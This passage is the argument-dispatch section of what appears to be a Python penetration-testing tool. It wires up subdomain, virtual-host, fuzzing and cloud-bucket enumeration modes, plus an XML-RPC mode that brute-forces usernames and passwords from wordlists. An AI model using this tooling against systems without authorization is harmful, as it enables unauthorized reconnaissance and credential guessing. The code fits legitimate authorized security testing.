                auto_throttle=getattr(args,"auto_throttle",False),
                burp=getattr(args,"burp",False),
                query_params=getattr(args,"query_params",""),
                pattern_file=getattr(args,"pattern_file",None),
                dont_scan=getattr(args,"dont_scan",[]),
                response_size_limit=getattr(args,"response_size_limit",DEFAULT_RESP_LIMIT),
            )
            scanner.checkAndRun()
        except FileNotFoundError as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)
        except Exception as e:
            print(Fore.RED + f"[FATAL] {e}" + Style.RESET_ALL)
            if "--debug" in sys.argv: raise
            sys.exit(1)

    # ─────────────────────────────────────────────────────────────────────
    #  SUBDOMAIN
    # ─────────────────────────────────────────────────────────────────────
    elif mode == "subdomain":
        _resolve_url_file(args, for_wordlist=True)
        if not getattr(args,"domain",None):
            mode_parser.error("--domain is required")
        wordfile = getattr(args,"wordfile",None) or getattr(args,"url_file",None)
        if not wordfile:
            mode_parser.error("-w/--wordlist is required")
        if not HAS_DNSPY and getattr(args,"resolver",None):
            print(Fore.YELLOW + "[WARN] dnspython not installed; --resolver ignored. pip install dnspython" + Style.RESET_ALL)
        try:
            SubdomainScanner(
                domain=args.domain, wordfile=wordfile,
                threads=args.threads, resolver=getattr(args,"resolver",None),
                protocol=getattr(args,"protocol","udp"),
                check_cname=getattr(args,"check_cname",False),
                wildcard=getattr(args,"wildcard",False),
                no_fqdn=getattr(args,"no_fqdn",False),
                delay=getattr(args,"delay",0.0),
                wordlist_offset=getattr(args,"wordlist_offset",0),
                output=getattr(args,"output",None),
                quiet=args.quiet, no_progress=args.no_progress,
                no_error=args.no_error, no_color=args.no_color,
                debug=args.debug,
                pattern_file=getattr(args,"pattern_file",None),
                timeout=getattr(args,"timeout",1.0),
            ).run()
        except (FileNotFoundError, ValueError) as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)

    # ─────────────────────────────────────────────────────────────────────
    #  VHOST
    # ─────────────────────────────────────────────────────────────────────
    elif mode == "vhost":
        _resolve_url_file(args, for_wordlist=True)
        if not getattr(args,"url",None):
            mode_parser.error("-u/--url is required")
        wordfile = getattr(args,"wordfile",None) or getattr(args,"url_file",None)
        if not wordfile:
            mode_parser.error("-w/--wordlist is required")
        try:
            VhostScanner(
                url=args.url, wordfile=wordfile,
                threads=args.threads, delay=getattr(args,"delay",0.0),
                wordlist_offset=getattr(args,"wordlist_offset",0),
                output=getattr(args,"output",None),
                append_domain=getattr(args,"append_domain",False),
                domain=getattr(args,"domain",None),
                exclude_length=getattr(args,"exclude_length",None),
                exclude_status=getattr(args,"exclude_status",None),
                force=getattr(args,"force",False),
                exclude_hostname_length=getattr(args,"exclude_hostname_length",False),
                cookies=getattr(args,"cookies",""), headers=getattr(args,"headers",""),
                user=getattr(args,"user",None), password=getattr(args,"password",None),
                follow_redirect=getattr(args,"follow_redirect",False),
                method=getattr(args,"method","GET"),
                user_agent=getattr(args,"user_agent",None),
                random_agent=getattr(args,"random_agent",False),
                proxy_url=getattr(args,"proxy_url",""),
                insecure=getattr(args,"insecure",False),
                timeout=getattr(args,"timeout",DEFAULT_TIMEOUT),
                retry=getattr(args,"retry",False),
                retry_attempts=getattr(args,"retry_attempts",3),
                client_cert=getattr(args,"client_cert",None),
                client_key=getattr(args,"client_key",None),
                quiet=args.quiet, no_progress=args.no_progress,
                no_error=args.no_error, no_color=args.no_color,
                debug=args.debug,
                pattern_file=getattr(args,"pattern_file",None),
                no_canonicalize_headers=getattr(args,"no_canonicalize_headers",False),
            ).run()
        except (FileNotFoundError, ValueError) as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)

    # ─────────────────────────────────────────────────────────────────────
    #  FUZZ
    # ─────────────────────────────────────────────────────────────────────
    elif mode == "fuzz":
        _resolve_url_file(args, for_wordlist=True)
        if not getattr(args,"url",None):
            mode_parser.error("-u/--url is required")
        wordfile = getattr(args,"wordfile",None) or getattr(args,"url_file",None)
        if not wordfile:
            mode_parser.error("-w/--wordlist is required")
        try:
            FuzzScanner(
                url=args.url, wordfile=wordfile,
                threads=args.threads, delay=getattr(args,"delay",0.0),
                wordlist_offset=getattr(args,"wordlist_offset",0),
                output=getattr(args,"output",None),
                exclude_status=getattr(args,"exclude_status",None),
                exclude_length=getattr(args,"exclude_length",None),
                body=(__fb := (getattr(args,"data_urlencoded","") or getattr(args,"data_json","") or getattr(args,"body",None) or "") or None),
                cookies=getattr(args,"cookies",""),
                headers=(getattr(args,"headers","") +
                         (",Content-Type:application/x-www-form-urlencoded" if (getattr(args,"data_urlencoded","") and "content-type" not in (getattr(args,"headers","") or "").lower()) else "") +
                         (",Content-Type:application/json" if (getattr(args,"data_json","") and "content-type" not in (getattr(args,"headers","") or "").lower()) else "")),
                user=getattr(args,"user",None), password=getattr(args,"password",None),
                follow_redirect=getattr(args,"follow_redirect",False),
                method=("POST" if __fb and getattr(args,"method","GET")=="GET" else getattr(args,"method","GET")),
                user_agent=getattr(args,"user_agent",None),
                random_agent=getattr(args,"random_agent",False),
                proxy_url=getattr(args,"proxy_url",""),
                insecure=getattr(args,"insecure",False),
                timeout=getattr(args,"timeout",DEFAULT_TIMEOUT),
                retry=getattr(args,"retry",False),
                retry_attempts=getattr(args,"retry_attempts",3),
                client_cert=getattr(args,"client_cert",None),
                client_key=getattr(args,"client_key",None),
                quiet=args.quiet, no_progress=args.no_progress,
                no_error=args.no_error, no_color=args.no_color,
                debug=args.debug,
                pattern_file=getattr(args,"pattern_file",None),
                no_canonicalize_headers=getattr(args,"no_canonicalize_headers",False),
            ).run()
        except (FileNotFoundError, ValueError) as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)

    # ─────────────────────────────────────────────────────────────────────
    #  CLOUD
    # ─────────────────────────────────────────────────────────────────────
    elif mode == "cloud":
        if not getattr(args,"keywords",[]) and not getattr(args,"keyfile",None):
            mode_parser.error("At least one keyword required: -k KEYWORD  or  -kf FILE")
        try:
            CloudScanner(
                keywords=getattr(args,"keywords",[]),
                keyfile=getattr(args,"keyfile",None),
                mutations=getattr(args,"mutations",None),
                threads=getattr(args,"threads",5),
                nameserver=getattr(args,"nameserver",None),
                logfile=getattr(args,"logfile",None),
                log_format=getattr(args,"log_format","text"),
                disable_aws=getattr(args,"disable_aws",False),
                disable_gcp=getattr(args,"disable_gcp",False),
                disable_azure=getattr(args,"disable_azure",False),
                quickscan=getattr(args,"quickscan",False),
                max_files=getattr(args,"max_files",5),
                show_files=getattr(args,"show_files",True),
                proxy_url=getattr(args,"proxy_url",""),
                insecure=getattr(args,"insecure",False),
                timeout=getattr(args,"timeout",10),
                quiet=args.quiet, no_progress=args.no_progress,
                no_error=args.no_error, no_color=args.no_color,
                debug=args.debug,
            ).run()
        except (FileNotFoundError, ValueError) as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)


    # ─────────────────────────────────────────────────────────────────────
    #  XMLRPC
    # ─────────────────────────────────────────────────────────────────────
    elif mode == "xmlrpc":
        if not getattr(args,"url",None):
            mode_parser.error("-u/--url is required")
        if not getattr(args,"userfile",None):
            mode_parser.error("-U/--username is required")
        if not getattr(args,"passfile",None):
            mode_parser.error("-P/--password is required")
        proxy = getattr(args,"proxy_url","")
        if getattr(args,"burp",False): proxy = "http://127.0.0.1:8080"
        try:
            XmlRpcScanner(
                url=args.url,
                userfile=args.userfile,
                passfile=args.passfile,
                threads=args.threads,
                delay=getattr(args,"delay",0.0),
                timeout=getattr(args,"timeout",10),
                proxy_url=proxy,
                insecure=getattr(args,"insecure",False) or bool(proxy),
                output=getattr(args,"output",None),
                stop_on_first=getattr(args,"stop_on_first",False),
                quiet=args.quiet, no_progress=args.no_progress,
                no_color=args.no_color, debug=args.debug,
            ).run()
        except (FileNotFoundError, ValueError) as e:
            print(Fore.RED + f"[ERROR] {e}" + Style.RESET_ALL); sys.exit(1)

if __name__ == "__main__":
    main()
